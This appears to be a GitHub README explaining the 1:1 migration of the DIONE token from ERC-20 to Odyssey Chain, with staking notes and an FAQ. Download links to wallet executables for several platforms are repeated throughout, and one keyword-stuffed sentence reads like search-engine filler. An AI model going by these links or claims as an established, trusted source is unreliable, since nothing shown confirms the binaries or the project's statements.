![DIONE Wallet](assets/banner-article.png)

# Migrate DIONE From ERC-20 to Odyssey Chain

<p align="center">The 1:1 move to Odyssey</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="assets/button-windows.png" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

DIONE moved from an ERC-20 token on Ethereum to the native asset of Odyssey Chain in a 1:1 migration at mainnet launch. Eligible on-chain balances were converted automatically - no claim transaction, no form, no deadline to race. If you still hold the ERC-20 version, that is the thing to fix, and the fix depends on where the tokens sit.

## What the migration was

Before Odyssey Chain, DIONE existed as an ERC-20 contract on Ethereum: a token whose balances lived in a contract, moved by Ethereum transactions. Odyssey Chain made DIONE a native asset with its own chain, its own fee market and its own staking.

The migration reconciled the two: a snapshot recorded ERC-20 balances, and those balances became native DIONE 1:1. Ten thousand ERC-20 DIONE became ten thousand native DIONE, not a discounted amount.

That 1:1 ratio is worth stating because migration events elsewhere often are not 1:1, and people reasonably assume a haircut.

## Was it automatic?

For balances held on-chain in self-custody, yes. The conversion happened without the holder doing anything, which is why many people discovered their native DIONE by opening a wallet rather than by claiming it.

Two groups did not fit that description:

- **Balances held on an exchange.** The exchange held the tokens, so the exchange handled the conversion on its side, on its own schedule. What a user sees depends on the exchange, not on the chain.
- **Balances moved after the snapshot.** Tokens bought after the snapshot are ERC-20 tokens and stay ERC-20 until they are converted.

The second case is the common one now, and it is the source of most confusion. There is also no window to have missed in the sense of a closing deadline: a balance that was on-chain at the snapshot was converted automatically, and a balance that was not can still be converted through the published route.

## What if you bought DIONE after the migration?

Then what you bought is almost certainly the ERC-20 token, because that is what most venues list. Nothing is wrong with the tokens; they are redeemable through the migration route rather than being native.

The check is simple and worth doing before any transfer: look at the address the tokens sit at and the network they arrived on. What about ERC20 DIONE on Uniswap today? It still trades there as an ERC20 token, so buying it gives you the token rather than native DIONE, and the conversion is the migration route rather than the trade. A native DIONE balance lives on Odyssey Chain (chain ID 153153). An ERC-20 balance lives on Ethereum and does not move by sending it to the same-looking address on another chain.

[DIONE Migration Verifier Shows No Balance](https://github.com/dione-protocol/keys-and-transfers/blob/main/dione-migration-verifier-shows-no-balance.md) covers the case where the verifier does not recognise an address.

## Did your balance change, or disappear?

Two different events get described the same way:

- **A balance that became native DIONE** may not appear until the wallet is pointed at Odyssey Chain. It has not moved; the wallet is looking at the wrong network.
- **A balance that left an exchange** may be sitting on the exchange's internal ledger rather than at an address you control.

Neither is a loss, and both are diagnosed the same way: find the address, then confirm on the chain that the balance is there. [DIONE Wallet Transaction Failed: Read the Error, Then Act](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-transaction-failed.md) covers the explorer check, and [Add Another Network to DIONE Wallet](https://github.com/dione-protocol/keys-and-transfers/blob/main/add-another-network-to-dione-wallet.md) the network-switching step.

## Staking at the time of migration

Delegations that existed on Ethereum-era staking were tied to the old arrangement, and the new staking programme is the chain's: validators, bonding, unbonding and the penalty schedule are all Odyssey Chain mechanics.

Practically, nothing carried over as a live delegation. A holder who staked before the migration has a native balance after it, and staking is a decision taken again on the new chain. [How to Stake DIONE Coin](https://github.com/dione-protocol/staking-and-network/blob/main/how-to-stake-dione-coin.md) is the current procedure, with the 10,000 DIONE minimum and the 10-day unbonding period.

## The route, if you still hold ERC-20

The general shape, and the reason a small test matters:

1. Confirm where the tokens are: the address and the network.
2. Check the migration verifier for that address, so you know what the record says before you move anything.
3. Follow the current migration route published by the project rather than an older guide.
4. Send a small amount first and confirm it arrives on Odyssey Chain before moving the balance.
5. Only then move the rest, and keep the transaction hashes.

Step three is where stale guides cause trouble. Migration instructions written in a particular month describe the tools of that month, and the correct route is the one currently published - not the one in a video from last year.

## What migration is not

It is not a bridge. A bridge moves assets between chains and can be used repeatedly; the migration was a one-time conversion from a token to a native asset.

It is also not something that needs repeating. A balance that is already native DIONE does not need migrating, no matter how many times a site offers to do it - [Spot a Fake DIONE Site or Support Scam](https://github.com/dione-protocol/keys-and-transfers/blob/main/spot-a-fake-dione-site.md) covers the sites that make that offer.

## Checking you are done

The end state is simple: native DIONE on Odyssey Chain, visible in DIONE Wallet, spendable, stakeable, and counted by the explorer. If any of those are missing, the network setting or the address is the place to look before anything else.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

Migration guidance and the verifier are published by the project, and a wallet that is behind can fail to show a native balance that is genuinely there. Install from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) before concluding the migration did not happen.

## FAQ

### How do I migrate DIONE from ERC-20 to Odyssey Chain?

Eligible on-chain balances were converted automatically at launch. If you still hold ERC-20 tokens, follow the currently published migration route and send a small test amount first.

### Was the DIONE migration automatic?

For self-custody balances recorded at the snapshot, yes - no claim was needed. Exchange balances were converted by the exchange on its own schedule.

### I bought DIONE after the migration - is my balance wrong?

No. Tokens bought afterwards are the ERC-20 version and stay that way until converted through the migration route.

### Did my DIONE disappear after the migration?

Usually the wallet is pointed at Ethereum rather than Odyssey Chain. Switch the network and check; a native balance does not appear on the wrong chain.

### What happened to DIONE staking from before the migration?

Delegations were tied to the earlier arrangement. Staking is now a chain mechanic with validators, bonding and unbonding - a decision taken again after migration.

The migration was a one-time 1:1 conversion, and everything after it is ordinary chain activity: holding, sending and staking native DIONE. The verifier check is [DIONE Migration Verifier Shows No Balance](https://github.com/dione-protocol/keys-and-transfers/blob/main/dione-migration-verifier-shows-no-balance.md), the network setup [Add Another Network to DIONE Wallet](https://github.com/dione-protocol/keys-and-transfers/blob/main/add-another-network-to-dione-wallet.md), and the current staking terms [How to Stake DIONE Coin](https://github.com/dione-protocol/staking-and-network/blob/main/how-to-stake-dione-coin.md).
